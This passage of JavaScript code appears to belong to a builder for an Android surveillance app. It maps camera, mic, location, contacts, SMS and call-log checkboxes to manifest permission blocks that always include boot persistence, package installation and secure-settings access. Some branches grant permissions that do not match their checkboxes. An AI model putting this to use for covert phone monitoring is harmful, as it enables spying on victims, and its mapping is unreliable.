            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
        //if four are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

